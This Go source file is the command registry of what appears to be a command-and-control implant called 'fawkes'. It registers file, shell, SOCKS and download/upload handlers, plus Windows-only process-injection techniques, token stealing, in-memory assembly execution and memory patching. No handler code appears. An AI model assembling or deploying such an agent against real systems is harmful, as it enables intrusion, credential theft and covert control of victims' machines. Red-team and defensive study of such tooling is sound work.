package commands

import (
	"log"
	"runtime"
	"sync"

	"fawkes/pkg/structs"
)

var (
	commandRegistry = make(map[string]structs.Command)
	registryMutex   sync.RWMutex
)

// Initialize sets up all available commands
func Initialize() {
	log.Printf("[INFO] Initializing command handlers")

	// Register commands
	RegisterCommand(&CatCommand{})
	RegisterCommand(&CdCommand{})
	RegisterCommand(&CpCommand{})
	RegisterCommand(&DownloadCommand{})
	RegisterCommand(&LsCommand{})
	RegisterCommand(&MkdirCommand{})
	RegisterCommand(&MvCommand{})
	RegisterCommand(&PsCommand{})
	RegisterCommand(&PwdCommand{})
	RegisterCommand(&RmCommand{})
	RegisterCommand(&RunCommand{})
	RegisterCommand(&SleepCommand{})
	RegisterCommand(&SocksCommand{})
	RegisterCommand(&UploadCommand{})
	RegisterCommand(&EnvCommand{})
	RegisterCommand(&ExitCommand{})
	RegisterCommand(&KillCommand{})
	RegisterCommand(&WhoamiCommand{})

	// Register Windows-specific commands
	if runtime.GOOS == "windows" {
		RegisterCommand(&ReadMemoryCommand{})
		RegisterCommand(&WriteMemoryCommand{})
		RegisterCommand(&AutoPatchCommand{})
		RegisterCommand(&StartCLRCommand{})
		RegisterCommand(&InlineAssemblyCommand{})
		RegisterCommand(&InlineExecuteCommand{})
		RegisterCommand(&VanillaInjectionCommand{})
		RegisterCommand(&ThreadlessInjectCommand{})
		RegisterCommand(&MakeTokenCommand{})
		RegisterCommand(&StealTokenCommand{})
		RegisterCommand(&Rev2SelfCommand{})
		RegisterCommand(&TsCommand{})
		RegisterCommand(&ApcInjectionCommand{})
		RegisterCommand(&PoolPartyInjectionCommand{})
		RegisterCommand(&ScreenshotCommand{})
		RegisterCommand(&SpawnCommand{})
		RegisterCommand(&OpusInjectionCommand{})
		RegisterCommand(&RegReadCommand{})
		RegisterCommand(&RegWriteCommand{})
	}

	log.Printf("[INFO] Registered %d command handlers", len(commandRegistry))
}

// RegisterCommand registers a command with the command registry
func RegisterCommand(cmd structs.Command) {
	registryMutex.Lock()
	defer registryMutex.Unlock()

	commandRegistry[cmd.Name()] = cmd
	// log.Printf("[DEBUG] Registered command: %s", cmd.Name())
}

// GetCommand retrieves a command from the registry
func GetCommand(name string) structs.Command {
	registryMutex.RLock()
	defer registryMutex.RUnlock()

	return commandRegistry[name]
}

// GetAllCommands returns all registered commands
func GetAllCommands() map[string]structs.Command {
	registryMutex.RLock()
	defer registryMutex.RUnlock()

	commands := make(map[string]structs.Command)
	for name, cmd := range commandRegistry {
		commands[name] = cmd
	}

	return commands
}
